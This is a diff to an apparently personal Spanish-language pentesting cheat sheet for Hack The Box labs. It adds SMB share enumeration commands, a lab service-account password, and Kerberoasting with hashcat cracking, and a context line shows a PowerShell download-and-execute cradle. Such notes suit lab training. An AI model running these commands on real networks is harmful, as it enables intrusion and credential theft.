@@ -1839,16 +1839,43 @@ Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http
 
 ```
 
-## Listar SMB shares
+## Listar SMB shares NULL session
 
 ```
 
-smbmap -H 10.129.2.148 -u 'masa'
+smbmap -H 10.129.2.148 -u 'loquesea'
+
+smbclient -L //10.129.2.148/ -U ""%""
 
 smbclient -L 10.129.2.148 -N
 
+smbclient //10.129.2.148/Replication -U ""%""
+
+enum4linux -a 10.129.2.148 # Permite saber si puedes leer o escribir en un share lee bien todo el output
+
+crackmapexec smb 10.129.2.148 --shares -u '' -p ''
 ```
 
+## Listar SMB Shares con credenciales
 
+```
+smbmap -H 10.10.10.100 -d active.htb -u SVC_TGS -p GPPstillStandingStrong2k18
+
+enum4linux -a -u "SVC_TGS" -p "GPPstillStandingStrong2k18" 10.129.2.148 # Puedes ver con este usuario que shares tiene acceso
+
+smbclient //10.10.10.100/Users -U active.htb\\SVC_TGS%GPPstillStandingStrong2k18
+
+```
+
+## Kerberoasting
+
+```bash
+GetUserSPNs.py -request -dc-ip 10.10.10.100 active.htb/SVC_TGS -save -outputfile GetUserSPNs.out
+
+# Este comando regresa si es que encuentra usuarios Kerberoasteables Obtienes el hash de tipo TGS-REP
+
+hashcat -m 13100 -a 0 GetUserSPNs.out /usr/share/wordlists/rockyou.txt --force
+
+```
 
 
